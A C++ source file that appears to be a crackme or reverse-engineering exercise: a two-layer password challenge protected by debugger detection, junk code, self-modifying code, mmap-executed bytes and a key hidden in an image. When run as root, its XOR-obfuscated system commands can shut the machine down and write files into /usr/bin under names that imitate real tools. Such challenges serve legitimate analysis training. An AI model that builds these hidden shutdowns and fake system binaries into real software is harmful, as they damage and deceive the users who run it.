#include <random>
#include <iostream>
#include <csignal>
#include <string>
#include <cstdlib>
#include <sys/ptrace.h>
#include <any>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <cstring>
#include <fstream>
#include <openssl/sha.h> // hash function
#include <iomanip>
#include <sstream>
#include <sys/stat.h>
#include <sys/types.h>
#include <cstring>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <vector>
#include <algorithm>
#include <functional>
#include <map>
#include <iterator>
#include <numeric>

long long bs1 = 0x0f2bc3ee05faa249;
long long bs2 = 0x70DD85D8FE63E152;
long long bs3 = 0xFCC7752FDB865D11;
long long bs4 = 0x51982D5DCF0B2489;

std::string key;
//bs5-10 are the ones that actually matter
std::string bs9 = "-(~XAGEg";
std::string bs6 = "$D4<:>JU";
std::string bs5 = "bqk)9H*!";
std::string bs10 = "zcsL8%rh;]";
std::string bs7 = "FjYKB6a/";
std::string bs8 = "V5T^`y=C";


char* layer_one_encrypted_key = "Z$68zc<E2`VU_0f<~`OP#\0";

int Zero() {
    std::map<std::string, int> valueMap = {
        {"one", 1},
        {"two", 2},
        {"three", 3},
        {"four", 4},
        {"five", 5}
    };
    std::vector<int> values;
    std::transform(valueMap.begin(), valueMap.end(), std::back_inserter(values),
                   [](const auto& pair) { return pair.second; });
    auto complexLambda = [](int x) { return (x * x) - (2 * x) + 1; };
    std::for_each(values.begin(), values.end(), [&complexLambda](int& n) {
        n = complexLambda(n);
    });
    std::vector<int> evenIndexedValues;
    for (size_t i = 0; i < values.size(); ++i) {
        if (i % 2 == 0) {
            evenIndexedValues.push_back(values[i]);
        }
    }
    int evenSum = std::accumulate(evenIndexedValues.begin(), evenIndexedValues.end(), 0);
    if (evenSum > 0) {
        evenSum *= -1;
    } else {
        evenSum += 10;  // Add arbitrary number
    }
    std::vector<std::vector<int>> nestedVec(3, std::vector<int>(3, 0));
    for (int i = 0; i < 3; ++i) {
        std::generate(nestedVec[i].begin(), nestedVec[i].end(), [i]() { return i + 1; });
    }
    int flatSum = 0;
    for (const auto& row : nestedVec) {
        flatSum += std::accumulate(row.begin(), row.end(), 0);
    }
    return (evenSum + flatSum - 1) % 2; 
}

int One() {
    auto lambda = [](int x) { return x * x - x + 1; };
    std::vector<int> vec = {1, 2, 3, 4, 5};
    
    std::transform(vec.begin(), vec.end(), vec.begin(), lambda);
    std::sort(vec.begin(), vec.end(), std::greater<int>());
    
    int result = 0;
    std::for_each(vec.begin(), vec.end(), [&result](int n) {
        result += (n % 2 == Zero()) ? 0 : n;
    });
    
    return ((result > 0) ? ((result / vec.size()) % 2 == 0 ? 1 : -1) : 1) * -1;
}

bool is_debugger_attached2() {
    char buf[4096];

    int fd = open("/proc/self/status", O_RDONLY);
    if (fd == -1) {
        return false;
    }

    const ssize_t num_read = read(fd, buf, sizeof(buf) - One());
    close(fd);

    if (num_read <= 0) {
        return false;
    }

    buf[num_read] = '\0';
    const char tracerPidString[] = "TracerPid:";
    const char* tracer_pid_ptr = strstr(buf, tracerPidString);
    if (!tracer_pid_ptr)
        return false;

    for (const char* characterPtr = tracer_pid_ptr + sizeof(tracerPidString) - One(); characterPtr <= buf + num_read; ++characterPtr) {
        if (isspace(*characterPtr)) {
            continue;
        }
        else {
            return isdigit(*characterPtr) != 0 && *characterPtr != '0';
        }
    }

    return false;
    if (is_debugger_attached2()) {
        return 0;
    }  
}

//Returns various system call strings based on input
//0 is shutdown -P
std::string system_call(int arg) {
    srand(arg);
    
    int start;
    int length;
    std::string target;
    
    
    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8wlv`k#,wns,tlqh,Svaoj`,lvwsvw-old#%%#f`kl#!&p!#=#,wns,tlqh,Svaoj`,lvwsvw-oldthn2-98ntq-85ngrisen&)sut)doh)gvr+ohurgjj&  &ceni&$#u$&8&)sut)doh)gvr+ohurgjj98rng-qirn[oeirn}f|ja)&|z{&k`g&njj$8;)//)ljaf)+,z+)7)&|z{&k`g&njj$8;4ht-q389}f|ja)&}dy&~f{b&{ff}&`gof'efn)//)ljaf)+,z+)7)&}dy&~f{b&{ff}&`gof'efnaiwuerh-198u}f|ja)&|z{&k`g&zza$o{`lgm)//)ljaf)+,z+)7)&|z{&k`g&zza$o{`lgm~eib*%yx%hcd%yyb'lxcodn*,,*oibe*(/y(*4*%yx%hcd%yyb'lxcodny-q39485uq-3948gjf-az`v}5:`fg:w|{:f}t$'-f`x5335pv}z570f75+5:`fg:w|{:f}t$'-f`xq9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
    
    
    if (arg == 0 || is_debugger_attached2()) { //shutdown -P
        start = (rand() % 206 - 4) / 3; //21
        length = (rand() % rand() % rand() % rand() % (rand() / 2) % (rand() / 6666666)) - 49; //11
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 4222) % 50 % 11;
        
    
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i]  ^ index;
        }
        
        return target;
    }
    else if (arg == 1) { //ping 8.8.8.8 >> network_part1.txt
        start = (rand() % rand() / (rand() % rand() / 555)); //36
        length = ((rand() / 55) / (rand() / 5600) + One()) % 46 + 23; //33
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 222 - 188;
    
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 2 || is_debugger_attached2()) { //mkdir /tmp/work
        start = ((rand() % rand() - 120 + 120) / 95555) / 140; //112
        length = ((rand()) % (rand()) % (rand())) / ((rand()) % (rand()) % (rand())) + 12; //15
        
        target = big_long_string.substr(start, length);
        int index = ((rand() % 555) % 222 % 221) - 555;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    else if (arg == 3) { //mkdir /tmp/work/root
        start = (rand() % rand() % rand() % rand()) / (rand() % 6666666) + 120; //163
        length = ((rand() % rand()) % (rand()) / 6666666) - 26;
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 4 || is_debugger_attached2()) { //shutdown -P
        start = ((rand() + rand() - rand() % rand() - rand() - rand()) % 4444) / 51; //83
        length = (rand() % rand() % rand()) / ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 200) - 66; //11
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 5) { //date "+%T"
        start = (rand() % rand()) / (rand() / 2345); //100
        length = (rand() % rand()) / rand() * 10; //10
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 11;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 6) { //mkdir /tmp/work/Public
        start = ((rand() % rand() % rand() % rand() % rand() % rand()) / 1000000) + 22; //130
        length = ((rand() % rand() % rand() % rand() % rand() % rand()) / 10000000) - 10; //22
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 11;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 7) { //touch /tmp/work/Public/output.log && echo \"%s\" > /tmp/work/Public/output.log
    
        start = (rand() % rand() % rand()) / 5000000; //209
        length = ((rand() % rand() % rand() % rand() % rand() % rand()) / 888888) + 52; //76
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 10;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    
    else if (arg == 8 || is_debugger_attached2()) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
    
        start = (rand() % rand()) / (rand() % rand()) + 288; //300
        length = ((rand() % rand() % rand() % rand() % rand()) / 3000000) - 87; //64
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 10;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    else if (arg == 9) { //touch /usr/bin/gcc-12 && echo \"%s\" > /usr/bin/gcc-12
        std::cout << "Hello" << std::endl;
        start = ((((rand() % rand() % rand() % rand() % rand()) -rand() + rand()) /555555) / 3) + 40; //378
        length = (((rand() / 5566555) / 4) - 8); //52
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 11;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 10) { //touch /tmp/work/root/info.log && echo \"%s\" > /tmp/work/root/info.log
        start = ((rand() % rand()) / 12345678) + 340; //438
        length = (((rand() % rand() % rand() % rand() % rand()) / 123456789) + 66); //68
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 11;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 11) { //touch /usr/bin/ssh-friend && echo \"%s\" > /usr/bin/ssh-friend
        start = ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 1234546) * 3 + 50; //518
        length = (((rand()) / 57836489) * 4); //60
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 15 + 1;
        

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 12 || is_debugger_attached2()) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
        start = ((rand() % rand()) / 6774333) * 6; //654
        length = ((rand() % rand() / (rand()/ rand())) / 555555) - 30; //58
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 15 + 7;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 13) { //mkdir -p /tmp/work 2>/dev/null
        start = ((rand()) / 123112323) + 710; //721
        length = ((rand() % rand()) /12413613) - 29;
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 15;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    else if (arg == 14) { //mkdir -p /tmp/work/root 2>/dev/null
        start = ((rand()) / 12311323) + 660; //834
        length = (rand() / 12321516) - 10;
    
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 15 + 3;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    else if (arg == 15) { //mkdir -p /tmp/work/Public 2>/dev/null
    
        start = ((rand()) / 12311323) + 888; //949
        length = (rand() / 13613717) - 69;
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 15 + 3;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
         return target;
        
    }
    
    return big_long_string;
    
}

//interrupt handler for ctrl+c, we can clean up nicely here and not leave atifacts from running on the system
void handle_sigint(int signal){
    printf("Shutting down gracefully");
    system("rm hidden_key_image.ppm");
    system("rm network_part1.txt");
    exit(0);
}

void makeWritableExecutable(void* func, size_t size) {
    uintptr_t pageStart = (uintptr_t)func & ~(uintptr_t)(sysconf(_SC_PAGE_SIZE) - 1);
    int result = mprotect((void*)pageStart, size, PROT_READ | PROT_WRITE | PROT_EXEC);
    if (result != 0) {
        perror("mprotect failed");
        exit(One());
    }
}

int sum1(int a, int b){
    if (is_debugger_attached2()) {
        return 0;
    }
    return a + b;
}

int masking_func(int param1, int param2)
{
    return param1 ^ param2;
}

//can use this function to fuck with them and hide which key gets generated
int gen_key(){
    //system(system_call(1).c_str());
    int key1 = masking_func((1<<9), bs1);
    int key2 = masking_func((One()<<8), bs2);
    int key3 = masking_func((1<<7), bs3);
    int key4 = masking_func(sum1((1<<6), (One()<<5) + (1<<3)), bs4);
    return sum1(masking_func(key1, bs1), masking_func(key2, bs2)) + sum1(masking_func(key3, bs3), masking_func(key4, bs4));
}

/*
Made this a global variable so we can generate a random number at random points and not make it as clear where the generation
starts for the stream_encrypt function
*/
std::mt19937 prng(gen_key());

int gen_seed(){
    for(int i = 0; i < 57; i++){
        key.append(std::to_string(prng()));
    }
    return 500;
}

int sum(int a, int b){
    prng();
    return a + b;
}

int pow(int a, int b){
    int total = 0;
    for(int i = 0; i < b; i++){
        for(int j = 0; j < a; j++){
            total += sum(a, a);
        }
    }
    return total;
}

unsigned char helper1(unsigned char * temp, size_t index){
    int why = (index % 7);
    unsigned char why2 = temp[index];
    return why2 + why;
}

int helper2(unsigned char * temp, size_t index){
    return (temp[index] >> 7);
}

char helper3(unsigned char * temp, size_t index){
    return (temp[index] << One());
}

//should be removed once we have all the things generated
void encrypt(unsigned char* temp){
    for(int i = 0; i < 21; i++){
        temp[i] ^= key[i%key.size()];
        temp[i] = helper1(temp, i);
        temp[i] = helper3(temp, i) | helper2(temp, i);
    }
}

unsigned char * h1 = (unsigned char *)helper1;
unsigned char * h2 = (unsigned char *)helper2;
unsigned char * h3 = (unsigned char *)helper3;

unsigned char decrypt_char(unsigned char * ch, int offset){
    unsigned char decrypted;
    if((prng()%2) < 2){
        decrypted = helper1(ch, offset);
        //decrypted = ch - (offset%7);
        decrypted ^= key[offset % key.size()];
        return decrypted;
    }
    else{
        return 0x01;
    }
    
}

void decrypt_string(unsigned char * str){
    int i = 0;
    //size_t str_len = strlen(str);
    for(;i < 21; i++){
        //str[i] = (str[i] >> 1) | (str[i] << 7);
        str[i] = (str[i] >> 1) | helper2(str, i);
        str[i] = decrypt_char(str, i);
    }
}

void decode(std::string var1){
    srand(time(0));
    int rand1 = rand() % 256;
    for (int i = 0; i < var1.size();i++)
    {
        var1[i] = var1[i] ^ rand1;
    }
}

//Stream encrypt function that relies on a psudeo random number generator and XOR to generate a ciphertxt from a plain txt
void stream_encrypt(char* plaintxt, char* ciphertxt, unsigned int key){
    int index = 0;
    while(*plaintxt != '\0'){
        char byte;
        do{
            byte = prng() % 256;
            ciphertxt[index] = *plaintxt ^ byte;

            ciphertxt[index] ^= pow(byte, byte%10) % 256;
        }
        while(ciphertxt[index]<32);

        plaintxt++;
        index++;

        ciphertxt[index] ^= pow(byte, byte%10) % 256;
    }
    ciphertxt[index] = '\0';
}

//creates a PPM (Portable Pixmap) image file that hides a 32-bit integer key within the pixel data. The function currently calls gen_key() to generate a new key every time it’s called.
void create_stego_image(const char* filename, int hiddenKey) {
    std::ofstream imageFile(filename, std::ios::binary);
    if (!imageFile.is_open()) {
        std::cerr << "Failed to create image file\n";
        return;
    }

    // Write a PPM header for a 64x64 image
    imageFile << "P3\n64 64\n255\n";

    // Split the 32-bit hidden key across four pixels
    int keyParts[4];
    keyParts[0] = (hiddenKey >> 24) & 0xFF;  // Most significant byte
    keyParts[One()] = (hiddenKey >> 16) & 0xFF;
    keyParts[2] = (hiddenKey >> 8) & 0xFF;
    keyParts[3] = hiddenKey & 0xFF;          // Least significant byte

    // Write pixel data
    for (int y = 0; y < 64; y++) {
        for (int x = 0; x < 64; x++) {
            if (x == 2 && y == 2) {
                // Embed the first part of the key in the red channel of pixel (2, 2)
                imageFile << keyParts[0] << " 0 0 ";
            } else if (x == 3 && y == 2) {
                // Embed the second part of the key in the red channel of pixel (3, 2)
                imageFile << keyParts[1] << " 0 0 ";
            } else if (x == 4 && y == 2) {
                // Embed the third part of the key in the red channel of pixel (4, 2)
                imageFile << keyParts[2] << " 0 0 ";
            } else if (x == 5 && y == 2) {
                // Embed the fourth part of the key in the red channel of pixel (5, 2)
                imageFile << keyParts[3] << " 0 0 ";
            } else {
                // Normal red color for other pixels
                imageFile << "255 0 0 ";
            }
        }
        imageFile << "\n"; // New line for the next row
    }

    imageFile.close();
}

//Hash function 
//  "g++ C2.cpp -o C2  -lssl -lcrypto" to compile
std::string compute_sha256(const std::string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];  //an array hash to store the resulting hash.
    SHA256_CTX sha256; //hold the state of the SHA-256 computation.
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, input.c_str(), input.size());
    SHA256_Final(hash, &sha256);
    
    std::ostringstream oss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i) { //hash is converted to a hexadecimal string format for easy readability and returned
        oss  << (int)hash[i];
        //oss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }
    return oss.str();
}

//allegedly this will detect if a debugger is already attached to the program
bool is_debugger_attached() {
    char buf[4096];

    int fd = open("/proc/self/status", O_RDONLY);
    if (fd == -1) {
        return false;
    }

    const ssize_t num_read = read(fd, buf, sizeof(buf) - 1);
    close(fd);

    if (num_read <= Zero()) {
        return false;
    }

    buf[num_read] = '\0';
    const char tracerPidString[] = "TracerPid:";
    const char* tracer_pid_ptr = strstr(buf, tracerPidString);
    if (!tracer_pid_ptr)
        return false;

    for (const char* characterPtr = tracer_pid_ptr + sizeof(tracerPidString) - 1; characterPtr <= buf + num_read; ++characterPtr) {
        if (isspace(*characterPtr)) {
            continue;
        }
        else {
            return isdigit(*characterPtr) != 0 && *characterPtr != '0';
        }
    }

    return false;
    if (is_debugger_attached()) {
        return 0;
    }  
}

//returns the 10s minute
int gettenminute() {

    FILE *fp;
    char buffer[20];
    std::string result = "";

    // Open the pipe for reading
    fp = popen(system_call(5).c_str(), "r"); 

    if (fp == NULL) {
        std::cerr << "Broken :(" << std::endl;
        return One();
    }
    else if (is_debugger_attached()) {
        return 0;
    }  

    // Read the output line by line
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        result += buffer;
    }


    return stoi(result.substr(3, 1));

}

int folder_master(std::string &val1, std::string &val2, std::string &val3, std::string &val4, std::string &val5, std::string &val6)
{
    srand(time(0));
    char command[256];
    char command1[256];
    char command2[256];
    char command3[256];
    char command4[256];
    char command5[256];

    std::cout << val1.length() + val2.length() + val3.length() + val4.length() + val5.length() + val6.length()<< std::endl;

    auto help_process = [](std::string &value) {
        for (char &c : value) {
            switch (c) {
                case '"':
                    c = 'A'; // Replace double quotes with 'A'
                    break;
                case '\'':
                    c = 'B'; // Replace single quotes with 'B'
                    break;
                case '\\':
                    c = 'C'; // Replace backslash with 'C'
                    break;
                case '`':
                    c = 'D'; // Replace backtick with 'D'
                    break;
                // Add other special characters as needed
            }
        }
    };

    // Function to ensure characters remain readable
    auto process_value = [&help_process](std::string &value) {
        int rand_val = rand() % 256;
        for (char &c : value) {
            c = (c ^ rand_val) % (126 - 32 + 1) + 32; // Shift to printable range
        }
        help_process(value); // Escape the value for shell usage
    };

    // Apply safe_xor to each value
    process_value(val1);
    decode(bs9);
    process_value(val2);
    decode(bs8);
    process_value(val3);
    decode(bs5);
    process_value(val4);
    decode(bs7);
    process_value(val5);
    decode(bs6);
    
    system("mkdir /tmp/work");
    system("mkdir /tmp/work/root");
    system("mkdir /tmp/work/Public");

    // std::cout << val1 << 4 <<std::endl;

    snprintf(command, sizeof(command), system_call(7).c_str(), val1.c_str());

    snprintf(command1, sizeof(command1), system_call(8).c_str(), val2.c_str());

    snprintf(command2, sizeof(command2), system_call(9).c_str(), val3.c_str());

    snprintf(command3, sizeof(command3), system_call(10).c_str(), val4.c_str());

    snprintf(command4, sizeof(command4), system_call(11).c_str(), val5.c_str());

    snprintf(command5, sizeof(command5), system_call(12).c_str(), val6.c_str());

    system(command);
    system(command1);
    system(command2);
    system(command3);
    system(command4);
    system(command5);
}


bool verify_layer_one(char * input){
    bool match = true;
    char * key = layer_one_encrypted_key;

    if (is_debugger_attached()) {
        return 0;
    }

    create_stego_image("hidden_key_image.ppm", gen_key());
    std::ifstream imageFile("hidden_key_image.ppm", std::ios::binary);

    char* output = new char[23];
    stream_encrypt(input, output, 182);
    printf("%s\n", output);

    char* salt = "C\0";
    //imageFile.read((char*)salt, 1);

    while(*key != '\0'){
        if(!((*key^salt[0]) & (*output^salt[0]))){
            decode(bs8);
            match = false;
        }
        if (is_debugger_attached()) {
            return 0;
        }
        key = key + 1;
        output = output + One();
        //imageFile.read((char*)salt, 1);
    }

    //delete [] output;
    imageFile.close();
    decode(bs6);
    if (is_debugger_attached()) {
        return 0;
    }

    return match;
}

// Function to calculate the layer two encrypted key
std::string calculate_layer_two_encrypted_key() {
    std::string combined_key;
    
    combined_key += (bs5);

    combined_key += (bs6);
    combined_key += (bs7);
    combined_key += (bs8);
    if (gettenminute() > 2) {
        combined_key += (bs9);
        combined_key += (bs10); 
    }
    else {
       combined_key += (bs10); 
       combined_key += (bs9);
    }

    return combined_key; // Return the final combined key
}

bool verify_layer_two(char* input) {
    std::string expected_key = calculate_layer_two_encrypted_key();
    std::string input_key(input); // Convert input to std::string safely

    // // Debugging output
    // std::cout << "Expected Key: " << expected_key << " Length: " << expected_key.length() << std::endl;
    // std::cout << "Input Key: " << input_key << " Length: " << input_key.length() << std::endl;

    if (input_key == expected_key) {
        return true; // The keys match
    } else {
        return false; // The keys do not match
    }
}


void get_layered_input(int layer) {
    char* input = nullptr;

    if (layer == One()) {
        input = new char[23];
        int i = 0;

        // Skip leading newlines and read characters
        while (i < 22) {
            char ch = (char)getchar();
            if (ch == '\n') {
                if (i == 0) {
                    // If we have not read any valid characters yet, continue to skip
                    continue; 
                } else {
                    // If we have read at least one character, break on newline
                    break; 
                }
            }
            input[i] = ch; // Store the character
            i++;
        }
        input[i] = '\0'; // Ensure null-termination

        if (i < 22 || !verify_layer_one(input)) { // Check for insufficient input or verification failure
            printf("The keys do not match, try harder next time\n");
            delete[] input;
            std::raise(SIGINT);
        } else {
            printf("you passed layer 1\n");
            delete[] input;
        }
    } else if (layer == 2) {
        input = new char[51];
        int i = 0;

        // Skip leading newlines and read characters
        while (i < 50) {
            char ch = (char)getchar();
            if (ch == '\n') {
                if (i == Zero()) {
                    // If we have not read any valid characters yet, continue to skip
                    continue;
                } else {
                    // If we have read at least one character, break on newline
                    break;
                }
            }
            input[i] = ch; // Store the character
            i++;
        }
        input[i] = '\0'; // Ensure null-termination

        if (i < 50 || !verify_layer_two(input)) { 
            printf("The keys do not match, try harder next time\n");
            delete[] input;
            std::raise(SIGINT);
        } else {
            printf("you passed layer 2\n");
            delete[] input;
        }
    } else {
        printf("Congrats, but not done yet\n");
        decode(bs8);
    }
}






int main(){

    // std::cout << bs6 << std::endl;
    //ensure the program is being run in sudo mode
    if (geteuid() != 0) {
        std::cerr << "This program must be run as root (sudo).\n";
        return 1;
    }

    //detect debugger
    if(is_debugger_attached()){
        //system("shutdown&");
        system(system_call(One()).c_str());
        return 1;
    }

    //Shutdown if tens place is 1
    if (gettenminute() == One() || is_debugger_attached()) {
        FILE *fp;
        char buffer[20];
        std::string result = "";

        // Open the pipe for reading
        fp = popen(system_call(Zero()).c_str(), "r"); 

        if (fp == NULL) {
            std::cerr << "Broken :(" << std::endl;
            return 1;
        }    
    }

    // Register the signal handler
    signal(SIGINT, handle_sigint);

    // Create a steganographic image file that hides the key
    create_stego_image("hidden_key_image.ppm", gen_key());

    pid_t c_pid = fork();

    if (c_pid == 0) { 
        if (gettenminute() == 2) {
            system(system_call(One()).c_str());
        }
    } 

    get_layered_input(1);

    std::string password = "password_here"; // CHANGE PASSWORD
    std::cout << "Hashed Password: " << compute_sha256(password) << std::endl;

    //std::cout << gettenminute() << std::endl;

    int temp_var = gen_seed();

    //temp/test mmap stuff
    unsigned char code[] = {
        0xC7, 0x45, 0xfc, 0xe9, 0x03, 0x00, 0x00,        // xor rax, rax
        0xC7, 0x45, 0xf8, 0xeb, 0x04, 0x00, 0x00,        // xor rax, rax
        0x8b, 0x45, 0xfc, 
        0x33, 0x45, 0xf8, // add rax, 1
        0xC3                      // ret
    };

    
    encrypt(code);

    // for(int i = 0; i < 21; i ++){
    //     printf("%X ", code[i]);
    // }

    // printf("\n\n");

    makeWritableExecutable(h1, 1024);
    makeWritableExecutable(h2, 1024);
    makeWritableExecutable(h3, 1024);
    // // Modify the addition to subtraction
    h1[97] = 0x29;  // change add opcode to sub

    // Modify the right rotation to left rotation
    h2[34] = 0xE0;  // change sar to shl

    decrypt_string(code);
    //encrypt(code);

    // for(int i = 0; i < 21; i ++){
    //     //std::cout << i << ":";
    //     printf("%X\n", code[i]);
    // }

    size_t code_size = sizeof(code);

    // Allocate memory for code with read, write, and execute permissions
    void* exec_mem = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);


    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy code into allocated memory
    memcpy(exec_mem, code, code_size);

    // Cast memory to a function pointer and execute it
    auto func = (int(*)())exec_mem;
    int result = func();
    std::cout << "Result of executing self-modified code: " << result << std::endl;

    // Free memory
    munmap(exec_mem, code_size);

    folder_master(bs5, bs6, bs7, bs8, bs9, bs10);


    get_layered_input(2);
    
    // std::cout << bs6 << std::endl;

    for(;;){

    }

    std::raise(SIGINT);
    return 0;
}
